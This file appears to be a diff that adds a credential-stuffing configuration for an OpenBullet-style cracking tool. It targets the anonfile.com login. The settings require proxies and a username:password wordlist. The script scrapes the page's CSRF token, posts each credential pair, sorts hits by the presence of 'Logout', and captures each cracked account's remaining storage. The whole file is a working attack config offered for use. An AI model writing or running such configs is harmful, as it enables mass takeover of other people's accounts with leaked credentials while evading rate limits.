@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "AnonFile",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-26T21:20:17.5977527+10:00",
+  "AdditionalInfo": "[Paradox Config]",
+  "Author": "Croppable",
+  "Version": "1.3.5 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://anonfile.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "input type=\"hidden\" name=\"_token\" value=\"" "\">" -> CAP "elRekt" 
+
+REQUEST POST "https://anonfile.com/login" 
+  CONTENT "username=<USER>&password=<PASS>&_token=<elRekt>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://anonfile.com" 
+  HEADER "referer: https://anonfile.com/login" 
+  HEADER "upgrade-insecure-requests: 1" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password" 
+
+PARSE "<SOURCE>" LR "p id=\"top-navbar-info-text\" class=\"navbar-text hidden-xs\">" "<a href=\"https://" -> CAP "Space Left" 
+
